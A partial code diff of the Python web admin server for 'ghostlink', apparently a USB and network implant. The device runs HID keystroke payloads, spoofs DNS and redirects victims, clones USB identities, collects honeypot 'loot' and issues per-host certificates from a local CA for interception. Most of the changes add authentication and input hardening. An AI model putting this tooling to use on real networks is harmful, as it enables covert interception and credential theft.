         loc = to + (self.path if preserve and self.path and self.path != "/" else "")
         self.send_response(302)
@@ -3917,12 +4656,21 @@ document.addEventListener('submit', function(e){
                 "records_count": recs, "free_mb": self._free_mb(),
                 "cfg_gen": int(CFG_PATH.stat().st_mtime) if CFG_PATH.exists() else 0,
                 "uptime": uptime_str(),
+                "sd": sd_status(),
+                "record_dir": str(REC_DIR.resolve()) if REC_DIR.exists() else str(REC_DIR),
+                "hid_device": os.path.exists("/dev/hidg0"),
+                "dnsmasq": dnsmasq_running(),
+                "redirect_info": redirect_info(cfg),
+                "https": _HTTPS_ON,
+                "seen": read_seen(50),
+                "checks": redirect_check_state(),
             })
         elif p == "/api/live":
             st = read_stats(); st["ifaces"] = ifaces_snapshot(); st["tail"] = tail_verdicts(50)
             if "free_mb" not in st: st["free_mb"] = self._free_mb()
             self._send_json(st)
         elif p == "/api/config":
+            if not self._require_admin(): return
             self._send(200, "text/plain", CFG_PATH.read_text() if CFG_PATH.exists() else "")
         elif p == "/api/records":
             out = []
@@ -3953,18 +4701,20 @@ document.addEventListener('submit', function(e){
             qs = parse_qs(u.query)
             host = qs.get("host", [""])[0].lower()
             rule = qs.get("rule", [""])[0].upper()
-            files = sorted(VER_DIR.glob("rec_*.jsonl"),
-                           key=lambda p: p.stat().st_mtime, reverse=True) if VER_DIR.exists() else []
+            files = sorted(VER_DIR.glob("rec_*.jsonl"), key=_rec_index, reverse=True) if VER_DIR.exists() else []
             lines = []
-            for f in files[:4]:
-                try:
-                    for ln in f.read_text().splitlines():
-                        if host and host not in ln.lower(): continue
-                        if rule and f'"rule":"{rule}"' not in ln: continue
-                        lines.append(ln)
-                        if len(lines) >= 500: break
-                except Exception: pass
+            # Newest file first and newest line first, so the 500-line cap keeps the newest matches.
+            # The scan stops at the cap, so the older ring files are rarely read.
+            for f in files:
+                try: file_lines = f.read_text().splitlines()
+                except Exception: continue
+                for ln in reversed(file_lines):
+                    if host and host not in ln.lower(): continue
+                    if rule and f'"rule":"{rule}"' not in ln: continue
+                    lines.append(ln)
+                    if len(lines) >= 500: break
                 if len(lines) >= 500: break
+            lines.reverse()   # the reply is oldest first, as before
             self._send(200, "application/x-ndjson", "\n".join(lines))
         elif p == "/api/scripts":
             # list scripts under PAY_DIR
@@ -4019,11 +4769,15 @@ document.addEventListener('submit', function(e){
                 }
             cfg = load_cfg()
             out["mode"] = cfg.get("NET_MODE", "PASSIVE").upper()
-            out["forwarder_running"] = bool(
-                any("forwarder.py" in ln for ln in
-                    subprocess.run(["ps"], capture_output=True, text=True, timeout=2)
-                              .stdout.splitlines())
-            )
+            out["auto_forward"] = str(cfg.get("AUTO_FORWARD", "TRUE")).strip().upper() in ("TRUE", "YES", "ON", "1")
+            out["forwarder_running"] = _forwarder_alive()
+            try:
+                st = FORWARDER_STATUS.read_text().strip()
+            except Exception:
+                st = ""
+            # "running: ..." while the forwarder is down means it died without
+            # writing its stop reason, so only "stopped: ..." is shown.
+            out["forwarder_status"] = st if st.startswith("stopped") else ""
             self._send_json(out)
         elif p == "/api/clone/hosts":
             # Return every host currently in the DHCP lease DB, enriched
@@ -4058,17 +4812,24 @@ document.addEventListener('submit', function(e){
             custom = HONEY_HTML.exists()
             loot_n = 0
             if HONEY_LOOT.exists():
-                try: loot_n = sum(1 for _ in HONEY_LOOT.open())
+                try:
+                    st = HONEY_LOOT.stat()
+                    key = (st.st_mtime_ns, st.st_size)
+                    if _LOOT_COUNT["key"] != key:      # count again only when the file changed
+                        with HONEY_LOOT.open("rb") as fh:
+                            _LOOT_COUNT.update(key=key, n=sum(1 for _ in fh))
+                    loot_n = _LOOT_COUNT["n"]
                 except Exception: pass
-            # Is the honeypot IP currently bound to the iface?
+            # Is the honeypot IP currently bound to the iface? Only asked when an IP is set.
             hp_ip = (cfg.get("HONEYPOT_IP","") or "").strip()
             ip_bound = False
             iface = cfg.get("DNSMASQ_IFACE","usb0") or "usb0"
-            try:
-                r = subprocess.run(["ip","-o","addr","show","dev",iface],
-                                   capture_output=True, text=True, timeout=2)
-                ip_bound = bool(hp_ip and hp_ip in r.stdout)
-            except Exception: pass
+            if hp_ip:
+                try:
+                    r = subprocess.run(["ip","-o","addr","show","dev",iface],
+                                       capture_output=True, text=True, timeout=2)
+                    ip_bound = hp_ip in r.stdout
+                except Exception: pass
             self._send_json({
                 "enabled":        cfg.get("HONEYPOT","FALSE").upper()=="TRUE",
                 "custom_html":    custom,
@@ -4118,8 +4879,13 @@ document.addEventListener('submit', function(e){
             out = []
             if TIMELINE.exists():
                 try:
-                    data = TIMELINE.read_text(encoding="utf-8", errors="replace")
-                    for ln in reversed(data.splitlines()):
+                    # Only the tail: the log can grow to 2 MB and this runs every 3 s.
+                    with open(TIMELINE, "rb") as fh:
+                        fh.seek(0, 2); size = fh.tell()
+                        fh.seek(max(0, size - 128 * 1024))
+                        lines = fh.read().decode("utf-8", "replace").splitlines()
+                    if size > 128 * 1024: lines = lines[1:]   # the first line may be cut in half
+                    for ln in reversed(lines):
                         try: ev = json.loads(ln)
                         except Exception: continue
                         if since and ev.get("t", 0) <= since: break
@@ -4202,6 +4968,17 @@ document.addEventListener('submit', function(e){
             if not tok:
                 return self._send(401, "text/plain", "no session\n")
             self._cli_stream(tok)
+        elif p == "/api/certs/ca":
+            # Download the local CA certificate (for manual install on client PC)
+            if CAManager is None:
+                return self._send(501, "text/plain", "Certificate feature not available (certs module missing)\n")
+            try:
+                ca_mgr = CAManager(str(ROOT / "certs"))
+                cert_pem = ca_mgr.get_ca_cert_pem()
+                self._send(200, "application/x-pem-file", cert_pem,
+                          extra={"Content-Disposition": 'attachment; filename="ghostlink-ca.crt"'})
+            except Exception as e:
+                self._send(500, "text/plain", f"CA cert error: {e}\n")
         else:
             self._send(404, "text/plain", "not found\n")
 
@@ -4219,22 +4996,30 @@ document.addEventListener('submit', function(e){
         if origin:
             try:
                 oh = urlparse(origin).hostname or ""
-                if oh.lower() not in (host, "172.32.0.93", "ghostlink.local",
-                                      "localhost", "127.0.0.1"):
+                # The LAN IP is deliberately not an allowed origin. Our own UI
+                # already matches through `host` when it is opened on that IP. A
+                # page served from that IP by another LAN machine would otherwise
+                # pass this check, and admin POSTs are not gated by auth by default.
+                if oh.lower() not in (host, *ADMIN_HOSTS_FIXED):
                     return self._send(403, "text/plain", "cross-origin blocked\n")
             except Exception:
                 return self._send(400, "text/plain", "bad origin\n")
 
         try: n = int(self.headers.get("Content-Length") or 0)
         except ValueError: n = 0
+        if n < 0: n = 0   # rfile.read(-1) would wait until the client closes the connection
         # cap request bodies at 256 KB. config.txt is < 4 KB in practice; a
         # bigger body is either malformed or an attempt to fill flash via
         # /api/config POST — refuse early rather than reading it all.
         if n > 256 * 1024:
             return self._send(413, "text/plain", "payload too large\n")
         body = self.rfile.read(n) if n else b""
+        if u.path == "/api/redirect/check":
+            if not self._require_admin(): return
+            return self._send_json({"ok": True, "started": _start_redirect_check()})
         if u.path == "/api/config":
             if not self._require_admin(): return
+            body, redir_warns = _normalize_redirect_body(body)
             # Only reload dnsmasq if a DHCP/DNS/REDIRECT key actually
             # changed. Flipping ENABLE_HID or BUTTON_PAYLOAD does NOT need
             # a reload, and the 0.3-0.8 s dnsmasq restart gap was long
@@ -4244,7 +5029,8 @@ document.addEventListener('submit', function(e){
             # a fixed key list and only reload when one of those changed.
             NET_KEYS = ("DNSMASQ", "DNSMASQ_IFACE", "DHCP_RANGE",
                         "DNS_UPSTREAM", "REDIRECT", "REDIRECT_FROM",
-                        "REDIRECT_TO", "DNS_SPOOF", "DNS_SPOOF_HOSTS",
+                        "REDIRECT_TO", "REDIRECT_ALL", "REDIRECT_ALL_TO",
+                        "REDIRECT_EXEMPT", "DNS_SPOOF", "DNS_SPOOF_HOSTS",
                         "HONEYPOT_RULES")
             HP_KEYS  = ("HONEYPOT", "HONEYPOT_IP", "DNSMASQ_IFACE")
             # Serialize config writes — a parallel bindLiveSave + cfgSave
@@ -4270,10 +5056,44 @@ document.addEventListener('submit', function(e){
                         "ok": False,
                         "err": f"HONEYPOT_IP {hp_ip} collides with primary IP or DHCP range — pick a free IP (e.g. 172.32.0.254)",
                     }, code=400)
+                # Guard the "redirect all" keys: a bad target URL (when the mode
+                # is on) or an exempt entry with a space/slash rolls the whole
+                # file back, so nothing half-valid is ever applied.
+                redir_all_err = validate_redirect_all(new)
+                if redir_all_err:
+                    tmp = CFG_PATH.with_suffix(".new")
+                    tmp.write_bytes(prev_raw); tmp.replace(CFG_PATH)
+                    return self._send_json({"ok": False, "err": redir_all_err}, code=400)
             need_reload = any(old.get(k, "") != new.get(k, "") for k in NET_KEYS)
             if need_reload:
-                try: subprocess.run(["sh", str(ROOT/"ghostlink.sh"), "reload-dnsmasq"],
-                                    timeout=5, capture_output=True)
+                reload_err = None
+                try:
+                    r = subprocess.run(["sh", str(ROOT/"ghostlink.sh"), "reload-dnsmasq"],
+                                       timeout=5, capture_output=True, text=True)
+                    if r.returncode != 0:
+                        reload_err = (r.stderr or r.stdout or "unknown error").strip()[:200]
+                except Exception as e:
+                    reload_err = str(e)[:200]
+                if reload_err:
+                    # Do not report success when dnsmasq did not take the new settings. Put the old
+                    # file back, so the config on disk matches the dnsmasq that is running.
+                    try:
+                        tmp = CFG_PATH.with_suffix(".new")
+                        tmp.write_bytes(prev_raw); tmp.replace(CFG_PATH)
+                        subprocess.run(["sh", str(ROOT/"ghostlink.sh"), "reload-dnsmasq"],
+                                       timeout=5, capture_output=True)
+                    except Exception: pass
+                    try:
+                        with open(LOG_PATH, "a") as f:
+                            f.write(f"{time.strftime('%H:%M:%S')} webui ERROR: dnsmasq reload failed, old settings kept: {reload_err}\n")
+                    except Exception: pass
+                    return self._send_json({"ok": False, "err": "dnsmasq did not take the new settings, so they were not kept: " + reload_err}, code=500)
+            # Records go to the flash or to the SD card through a symlink that the shell sets. Re-point
+            # it when RECORD_SD changes; the sniffer sees the new target and rotates.
+            if old.get("RECORD_SD", "FALSE").upper() != new.get("RECORD_SD", "FALSE").upper():
+                try:
+                    subprocess.run(["sh", str(ROOT/"ghostlink.sh"), "apply-record-dir"],
+                                   timeout=10, capture_output=True)
                 except Exception: pass
             # Add/remove the honeypot's secondary IP if HONEYPOT or its IP changed.
             if any(old.get(k, "") != new.get(k, "") for k in HP_KEYS):
@@ -4295,17 +5115,51 @@ document.addEventListener('submit', function(e){
             # until a physical power-cycle. The safe rebind requires
             # orchestrating adbd across the UDC flap; see HID.md for the
             # SSH-watchdog procedure, which is the only approved path.
-            return self._send_json({"ok": True})
+            return self._send_json({"ok": True, "warnings": redir_warns})
+        if u.path == "/api/certs/gen":
+            # Generate a per-host certificate signed by the local CA.
+            # Request: {"hostname": "example.com"}
+            # Response: {"ok": true, "hostname": "...", "cert": "PEM", "key": "PEM"}
+            if not self._require_admin(): return
+            if CAManager is None:
+                return self._send_json({"ok": False, "err": "Certificate feature not available (certs module missing)"}, code=501)
+            try:
+                req = json.loads(body) if body else {}
+                hostname = (req.get("hostname") or "").strip().lower()
+                if not hostname:
+                    return self._send_json({"ok": False, "err": "hostname required"}, code=400)
+                # Validate hostname (basic: must be a valid domain pattern)
+                if not re.match(r'^[\w\-\.\*]+$', hostname):
+                    return self._send_json({"ok": False, "err": "invalid hostname"}, code=400)
+
+                ca_mgr = CAManager(str(ROOT / "certs"))
+                cert_pem, key_pem = ca_mgr.get_host_cert(hostname)
+                return self._send_json({
+                    "ok": True,
+                    "hostname": hostname,
+                    "cert": cert_pem,
+                    "key": key_pem
+                })
+            except Exception as e:
+                return self._send_json({"ok": False, "err": str(e)}, code=500)
         if u.path == "/api/clear":
             if not self._require_admin(): return
             removed = 0
-            for d, pat in ((REC_DIR,"*.pcap"), (VER_DIR,"*.jsonl")):
+            kept = 0
+            for d in (REC_DIR, VER_DIR):
                 if not d.exists(): continue
+                # The newest capture is the one being written. Unlinking it would leave the recorder
+                # writing to a file nobody can see, so it stays (and is reported as kept).
+                recs = sorted(d.glob("rec_*"), key=_rec_index)
+                active = recs[-1] if recs else None
                 for f in d.iterdir():
+                    if f == active:
+                        kept += 1; continue
                     try: f.unlink(); removed += 1
                     except Exception: pass
-            return self._send_json({"ok": True, "removed": removed})
+            return self._send_json({"ok": True, "removed": removed, "kept": kept})
         if u.path == "/api/delete":
+            if not self._require_admin(): return
             try: data = json.loads(body)
             except Exception: data = {}
             name = data.get("name","")
@@ -4315,6 +5169,7 @@ document.addEventListener('submit', function(e){
             try: (d/name).unlink(); return self._send_json({"ok": True})
             except Exception as e: return self._send_json({"ok": False, "err": str(e)}, code=500)
         if u.path == "/api/hid":
+            if not self._require_admin(): return
             payload = body.decode("utf-8","replace").strip()
             if not payload: return self._send_json({"ok": False}, code=400)
             # Constrain to files under /root/ghostlink/payloads. Reject
@@ -4342,6 +5197,7 @@ document.addEventListener('submit', function(e){
         # Must come BEFORE the generic /api/scripts/<name> save handler so
         # the "_runtemp" path doesn't get name-validated as a save target.
         if u.path == "/api/scripts/_runtemp":
+            if not self._require_admin(): return
             if len(body) > 128 * 1024:
                 return self._send_json({"ok": False, "err": "too large"}, code=413)
             if not body.strip():
@@ -4411,9 +5267,7 @@ document.addEventListener('submit', function(e){
                 f'USB_SER="{ser}"',
             ]
             try:
-                tmp = ID_ENV.with_suffix(".new")
-                tmp.write_text("\n".join(lines) + "\n")
-                tmp.replace(ID_ENV)
+                _atomic_write(ID_ENV, "\n".join(lines) + "\n")
                 return self._send_json({
                     "ok": True,
                     "identity": {"VID": vid, "PID": pid, "MFR": mfr,
@@ -4529,10 +5383,11 @@ document.addEventListener('submit', function(e){
             if not to:
                 # Avoid bouncing a victim back to the honeypot IP itself —
                 # that creates a short browser loop. Fall through to a
-                # neutral page in that case.
+                # neutral page in that case. The device's admin IPs (fixed
+                # and verified LAN IP) are never a bounce target either.
                 host = (rec["host"] or "").strip()
                 hp_ip = (cfg.get("HONEYPOT_IP","") or "").strip()
-                if host and host != hp_ip and host != "172.32.0.93":
+                if host and host != hp_ip and host != "172.32.0.93" and host not in lan_admin_ips():
                     to = f"https://{host}/"
                 else:
                     to = "https://www.google.com/"
@@ -4549,15 +5404,30 @@ document.addEventListener('submit', function(e){
                 return self._send_json({"ok": False, "err": "bundle too large (>16MB)"}, code=413)
             if len(body) < 32:
                 return self._send_json({"ok": False, "err": "empty / not a tarball"}, code=400)
+            MAX_IMPORT_FILE = 2 * 1024 * 1024       # per file: a bigger member refuses the whole bundle
+            MAX_IMPORT_TOTAL = 64 * 1024 * 1024     # uncompressed total: a small gzip cannot fill the disk
+            MAX_IMPORT_MEMBERS = 2000
             imported = []
             try:
                 tar = tarfile.open(fileobj=io.BytesIO(body), mode="r:gz")
             except Exception as e:
                 return self._send_json({"ok": False, "err": f"not a gzip tarball: {e}"}, code=400)
             try:
-                for m in tar.getmembers():
+                # Check the whole bundle before writing anything, so a refused bundle changes nothing.
+                members = tar.getmembers()
+                if len(members) > MAX_IMPORT_MEMBERS:
+                    return self._send_json({"ok": False, "err": "bundle has too many files"}, code=413)
+                reg = [m for m in members if m.isreg()]
+                if sum(m.size for m in reg) > MAX_IMPORT_TOTAL:
+                    return self._send_json({"ok": False, "err": "bundle expands to more than 64 MB"}, code=413)
+                if any(m.size > MAX_IMPORT_FILE for m in reg):
+                    return self._send_json({"ok": False, "err": "a file in the bundle is larger than 2 MB"}, code=413)
+                for m in members:
                     nm = (m.name or "").replace("\\", "/")
-                    if nm.startswith("/") or ".." in nm.split("/"):
+                    if not nm or nm.startswith("/") or ".." in nm.split("/"):
+                        # An empty name resolves to ROOT itself -- a regular-file member
+                        # with one would make the final tmp.replace(dest) overwrite the
+                        # whole ghostlink directory with that one file's contents.
                         continue
                     if m.issym() or m.islnk():
                         continue
@@ -4567,7 +5437,9 @@ document.addEventListener('submit', function(e){
                     if not m.isreg(): continue
                     f = tar.extractfile(m)
                     if not f: continue
-                    data = f.read(2 * 1024 * 1024)
+                    data = f.read()   # the size was checked before anything was written
+                    if nm == "identity.env" and not _identity_ok(data):
+                        continue   # a bad override would stop the USB gadget at boot: leave it out
                     dest = ROOT / nm
                     dest.parent.mkdir(parents=True, exist_ok=True)
                     tmp = dest.with_suffix(dest.suffix + ".new")
@@ -4600,7 +5472,10 @@ document.addEventListener('submit', function(e){
         if u.path == "/api/clone/identity":
             if not self._require_admin(): return
             try: data = json.loads(body)
-            except Exception: data = {}
+            except Exception: data = None
+            # An empty or unreadable body is not a request to clear the override. Clearing is DELETE.
+            if not isinstance(data, dict):
+                return self._send_json({"ok": False, "err": "send the identity as a JSON object"}, code=400)
             # Validate: VID/PID must be hex-ish or empty; strings sanitized
             # for shell inclusion (strip quotes/backticks/dollar/newlines)
             def _clean(s, n=64):
@@ -4628,9 +5503,7 @@ document.addEventListener('submit', function(e){
             if prod: lines.append(f'USB_PROD="{prod}"')
             if ser:  lines.append(f'USB_SER="{ser}"')
             try:
-                tmp = ID_ENV.with_suffix(".new")
-                tmp.write_text("\n".join(lines) + "\n")
-                tmp.replace(ID_ENV)
+                _atomic_write(ID_ENV, "\n".join(lines) + "\n")
                 return self._send_json({"ok": True})
             except Exception as e:
                 return self._send_json({"ok": False, "err": str(e)}, code=500)
@@ -4643,14 +5516,15 @@ document.addEventListener('submit', function(e){
             mode = (data.get("mode") or "").upper()
             if mode not in ("PASSIVE", "FORWARD"):
                 return self._send_json({"ok": False, "err": "mode must be PASSIVE or FORWARD"}, code=400)
-            # update config.txt line atomically
-            txt = CFG_PATH.read_text() if CFG_PATH.exists() else ""
-            if re.search(r"^NET_MODE=.*$", txt, re.MULTILINE):
-                txt = re.sub(r"^NET_MODE=.*$", f"NET_MODE={mode}", txt, flags=re.MULTILINE)
-            else:
-                txt += ("" if txt.endswith("\n") else "\n") + f"NET_MODE={mode}\n"
-            tmp = CFG_PATH.with_suffix(".new")
-            tmp.write_text(txt); tmp.replace(CFG_PATH)
+            # update config.txt line atomically; the lock stops an AUTO_FORWARD write interleaving
+            with _CFG_LOCK:
+                txt = CFG_PATH.read_text() if CFG_PATH.exists() else ""
+                if re.search(r"^NET_MODE=.*$", txt, re.MULTILINE):
+                    txt = re.sub(r"^NET_MODE=.*$", f"NET_MODE={mode}", txt, flags=re.MULTILINE)
+                else:
+                    txt += ("" if txt.endswith("\n") else "\n") + f"NET_MODE={mode}\n"
+                tmp = CFG_PATH.with_suffix(".new")
+                tmp.write_text(txt); tmp.replace(CFG_PATH)
             # ask the link watcher to react immediately: if FORWARD and
             # eth0 up, start the forwarder; if PASSIVE, kill it.
             if mode == "FORWARD":
@@ -4661,20 +5535,44 @@ document.addEventListener('submit', function(e){
                     try:
                         subprocess.run(["ip", "link", "set", "eth0", "up"], timeout=2)
                         subprocess.run(["ip", "link", "set", "eth0", "promisc", "on"], timeout=2)
-                        subprocess.Popen(["python3", str(ROOT/"forwarder.py"), "eth0", "usb0"])
                     except Exception: pass
+                    # The link status hint shows the reason if it did not stay up.
+                    _start_forwarder()
             else:
-                # kill forwarder if running
-                try:
-                    r = subprocess.run(["ps"], capture_output=True, text=True, timeout=2)
-                    for ln in r.stdout.splitlines():
-                        if "forwarder.py" in ln and "grep" not in ln:
-                            parts = ln.split()
-                            if parts and parts[0].isdigit():
-                                try: os.kill(int(parts[0]), 15)
-                                except Exception: pass
-                except Exception: pass
+                # kill forwarder if running, using pidfile instead of ps
+                pidfile = Path("/run/ghostlink-forwarder.pid")
+                # Signal only a pid that is really forwarder.py: a stale file can name a reused pid.
+                if pidfile.exists() and _forwarder_alive():
+                    try:
+                        pid = int(pidfile.read_text().strip())
+                        try: os.kill(pid, 15)  # SIGTERM
+                        except ProcessLookupError: pass
+                        # Wait up to 2s for it to die
+                        for _ in range(20):
+                            if not pidfile.exists():
+                                break
+                            time.sleep(0.1)
+                    except Exception: pass
+            _timeline("net_mode", mode=mode)
             return self._send_json({"ok": True, "mode": mode})
+
+        # ---- automatic forwarding (AUTO_FORWARD) ----------------------------
+        if u.path == "/api/net/auto":
+            if not self._require_admin(): return
+            try: data = json.loads(body)
+            except Exception: data = {}
+            on = bool(data.get("auto"))
+            val = "TRUE" if on else "FALSE"
+            with _CFG_LOCK:
+                txt = CFG_PATH.read_text() if CFG_PATH.exists() else ""
+                if re.search(r"^AUTO_FORWARD=.*$", txt, re.MULTILINE):
+                    txt = re.sub(r"^AUTO_FORWARD=.*$", f"AUTO_FORWARD={val}", txt, flags=re.MULTILINE)
+                else:
+                    txt += ("" if (not txt or txt.endswith("\n")) else "\n") + f"AUTO_FORWARD={val}\n"
+                tmp = CFG_PATH.with_suffix(".new")
+                tmp.write_text(txt); tmp.replace(CFG_PATH)
+            # the link watcher applies this within 2 seconds
+            return self._send_json({"ok": True, "auto_forward": on})
 
         # ---- extensions library (save) ----------------------------------
         if u.path.startswith("/api/extensions/"):
@@ -4716,6 +5614,7 @@ document.addEventListener('submit', function(e){
 
         # ---- scripts library (rename) ------------------------------------
         if u.path.endswith("/rename") and u.path.startswith("/api/scripts/"):
+            if not self._require_admin(): return
             old = u.path[len("/api/scripts/"):-len("/rename")]
             try: data = json.loads(body)
             except Exception: data = {}
@@ -4732,6 +5631,7 @@ document.addEventListener('submit', function(e){
 
         # ---- scripts library (run) ---------------------------------------
         if u.path.endswith("/run") and u.path.startswith("/api/scripts/"):
+            if not self._require_admin(): return
             name = u.path[len("/api/scripts/"):-len("/run")]
             if not SCRIPT_NAME_RE.match(name):
                 return self._send_json({"ok": False, "err": "bad name"}, code=400)
@@ -4748,6 +5648,7 @@ document.addEventListener('submit', function(e){
 
         # ---- stop any running payload ------------------------------------
         if u.path == "/api/hid/stop":
+            if not self._require_admin(): return
             killed = 0
             try:
                 r = subprocess.run(["ps"], capture_output=True, text=True, timeout=2)
@@ -4762,6 +5663,7 @@ document.addEventListener('submit', function(e){
 
         # ---- live key (one HID report + release) -------------------------
         if u.path == "/api/live/key":
+            if not self._require_admin(): return
             try: data = json.loads(body)
             except Exception: data = {}
             mod = int(data.get("mod", 0)) & 0xFF
@@ -4780,16 +5682,22 @@ document.addEventListener('submit', function(e){
         # ---- auth: login / logout ----------------------------------------
         if u.path == "/api/auth/login":
             ip = self._client_ip()
-            if _login_throttled(ip):
+            if not _login_allowed(ip):
                 return self._send_json({"ok": False, "err": "throttled"}, code=429)
             try: data = json.loads(body)
             except Exception: data = {}
+            if not isinstance(data, dict): data = {}   # a JSON list or number is a failed login, not a crash
             cfg = load_cfg()
             expect_user = cfg.get("WEBUI_USER", "root")
             expect_pass = cfg.get("WEBUI_PASS", "ghostlink")
-            u_in = data.get("user", "")
-            p_in = data.get("pass", "")
-            if secrets.compare_digest(u_in, expect_user) and secrets.compare_digest(p_in, expect_pass):
+            u_in = str(data.get("user", ""))
+            p_in = str(data.get("pass", ""))
+            # A blank WEBUI_USER or WEBUI_PASS in config.txt must never match, not even an
+            # empty login. compare_digest takes bytes, so a non-ASCII password still works.
+            creds_ok = (bool(expect_user and expect_pass)
+                        and secrets.compare_digest(u_in.encode(), expect_user.encode())
+                        and secrets.compare_digest(p_in.encode(), expect_pass.encode()))
+            if creds_ok:
                 tok = _session_new(u_in)
                 self.send_response(200)
                 self.send_header("Content-Type", "application/json")
@@ -4799,7 +5707,6 @@ document.addEventListener('submit', function(e){
                 self.send_header("Content-Length", str(len(b)))
                 self.end_headers(); self.wfile.write(b)
                 return
-            _login_record(ip)
             try:
                 with open(LOG_PATH, "a") as f:
                     f.write(f"{time.strftime('%H:%M:%S')} webui login FAIL from {ip} user={u_in[:16]}\n")
@@ -4831,6 +5738,7 @@ document.addEventListener('submit', function(e){
                 return self._send_json({"ok": False, "err": "no session"}, code=401)
             try: data = json.loads(body)
             except Exception: data = {}
+            if not isinstance(data, dict): data = {}
             cmd = data.get("cmd") or ""
             if not cmd.strip():
                 return self._send_json({"ok": False, "err": "empty cmd"}, code=400)
@@ -4851,7 +5759,9 @@ document.addEventListener('submit', function(e){
         # ---- CLI session reset: kill the shell and start a fresh one -----
         if u.path == "/api/cli/reset":
             if not self._require_auth(): return
-            tok = self._cookie_token()
+            tok = self._session_key()   # the validated key, so a Bearer caller resets its own shell
+            if not tok:
+                return self._send_json({"ok": False, "err": "no session"}, code=401)
             pty_close(tok)
             pty_open(tok)
             return self._send_json({"ok": True})
@@ -4880,8 +5790,12 @@ document.addEventListener('submit', function(e){
                 return self._send_json({"ok": False, "err": "no session"}, code=401)
             try: data = json.loads(body)
             except Exception: data = {}
-            rows = int(data.get("rows", 24))
-            cols = int(data.get("cols", 80))
+            if not isinstance(data, dict): data = {}
+            try:
+                rows = int(data.get("rows", 24))
+                cols = int(data.get("cols", 80))
+            except (TypeError, ValueError):
+                return self._send_json({"ok": False, "err": "bad size"}, code=400)
             s = pty_open(tok)
             try:
                 fcntl.ioctl(s["fd"], termios.TIOCSWINSZ,
@@ -4909,6 +5823,7 @@ document.addEventListener('submit', function(e){
     def do_DELETE(self):
         if self._maybe_redirect(): return
         u = urlparse(self.path)
+        if not self._require_admin(): return
         if u.path.startswith("/api/scripts/"):
             name = u.path[len("/api/scripts/"):]
             if not SCRIPT_NAME_RE.match(name):
@@ -4934,6 +5849,230 @@ document.addEventListener('submit', function(e){
             except Exception as e:
                 return self._send_json({"ok": False, "err": str(e)}, code=500)
         self._send(404, "text/plain", "not found\n")
+
+
+# ---- hostnames seen in traffic, auto-add, and the HTTPS redirect ------------------
+SEEN_PATH = Path("/run/ghostlink-seen.json")     # written by sniff.py (RAM only)
+_HTTPS_ON = False
+
+
+def read_seen(limit=50):
+    """Hostnames the sniffer has seen in traffic, most recent first."""
+    try:
+        data = json.loads(SEEN_PATH.read_text())
+    except (OSError, ValueError):
+        return []
+    data = [d for d in data if isinstance(d, dict) and isinstance(d.get("host"), str)]
+    data.sort(key=lambda d: d.get("last", 0), reverse=True)
+    return data[:limit]
+
+
+def _auto_add_once():
+    """Add seen names that are subdomains of a REDIRECT_FROM entry (same domain).
+    Returns the names added. Names that match nothing are only shown, never added."""
+    if (load_cfg().get("REDIRECT", "FALSE") or "").strip().upper() != "TRUE":
+        return []
+    added = []
+    with _CFG_LOCK:
+        cfg = load_cfg()
+        hosts, _ = redirect_hosts(cfg.get("REDIRECT_FROM", "") or "")
+        if not hosts:
+            return []
+        for d in read_seen(limit=500):
+            h = d["host"]
+            if h in hosts or h in admin_hosts() or h in added:
+                continue
+            match = next((p for p in hosts if h.endswith("." + p)), None)
+            if match:
+                added.append(h)
+                with open(LOG_PATH, "a") as f:
+                    f.write(f"{time.strftime('%H:%M:%S')} webui auto-add {h} (subdomain of {match})\n")
+        if not added:
+            return []
+        lines = CFG_PATH.read_bytes().decode("utf-8", "replace").split("\n")
+        new_from = ",".join(hosts + added)
+        # One REDIRECT_FROM line only. load_cfg reads the last one, so if a duplicate were left,
+        # the names just added would never be seen, and this would rewrite the config every 10 s.
+        out, placed = [], False
+        for line in lines:
+            if line.partition("=")[0].strip() == "REDIRECT_FROM":
+                if not placed:
+                    out.append("REDIRECT_FROM=" + new_from + ("\r" if line.endswith("\r") else ""))
+                    placed = True
+                continue
+            out.append(line)
+        if not placed:
+            out.append("REDIRECT_FROM=" + new_from)
+        lines = out
+        tmp = CFG_PATH.with_suffix(".new")
+        tmp.write_bytes("\n".join(lines).encode("utf-8"))
+        tmp.replace(CFG_PATH)
+    try:
+        subprocess.run(["sh", str(ROOT / "ghostlink.sh"), "reload-dnsmasq"],
+                       timeout=5, capture_output=True, text=True)
+    except Exception:
+        pass
+    return added
+
+
+def _auto_add_loop():
+    while True:
+        time.sleep(10)
+        try:
+            _auto_add_once()
+        except Exception as e:
+            try:
+                with open(LOG_PATH, "a") as f:
+                    f.write(f"{time.strftime('%H:%M:%S')} webui auto-add error: {e}\n")
+            except Exception:
+                pass
+
+
+class RedirectOnlyHandler(Handler):
+    """Port 443: redirects for REDIRECT_FROM hosts only. Anything else gets a 404, so the
+    admin UI is never served over TLS."""
+    def do_GET(self):
+        if not self._maybe_redirect():
+            self._send(404, "text/plain; charset=utf-8", "Not Found")
+
+    def do_HEAD(self):
+        self.do_GET()
+
+    def do_POST(self):
+        self._send(404, "text/plain; charset=utf-8", "Not Found")
+
+
+class RedirectOnlyServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
+    daemon_threads = True
+    allow_reuse_address = True
+
+    def handle_error(self, request, client_address):
+        pass   # failed TLS handshakes from scanners and browsers are normal here
+
+
+def _start_https(bind):
+    """Listen on 443 with the device's self-signed certificate (browsers show a warning)."""
+    global _HTTPS_ON
+    tls = ROOT / "tls"
+    cert, key = tls / "cert.pem", tls / "key.pem"
+    if not (cert.exists() and key.exists()):
+        sys.stderr.write(f"https redirect: no certificate in {tls}, port 443 not started\n")
+        return None
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    ctx.load_cert_chain(str(cert), str(key))
+    srv = RedirectOnlyServer((bind, 443), RedirectOnlyHandler)
+    # The handshake runs in the request thread, so one slow client cannot block accept().
+    srv.socket = ctx.wrap_socket(srv.socket, server_side=True, do_handshake_on_connect=False)
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+    _HTTPS_ON = True
+    sys.stderr.write("https redirect: listening on 443\n")
+    return srv
+
+
+# ---- redirect check: visit the target and the listed sites a few times -------------
+REDIRECT_CHECK = {"running": False, "started": 0, "finished": 0, "results": []}
+_CHECK_LOCK = threading.Lock()
+CHECK_ATTEMPTS = 3
+CHECK_MAX_HOSTS = 5
+CHECK_MAX_HOPS = 5
+
+
+def redirect_check_state():
+    with _CHECK_LOCK:
+        return {"running": REDIRECT_CHECK["running"], "started": REDIRECT_CHECK["started"],
+                "finished": REDIRECT_CHECK["finished"], "results": list(REDIRECT_CHECK["results"])}
+
+
+def _fetch(scheme, host, port, path, ip, timeout=8.0):
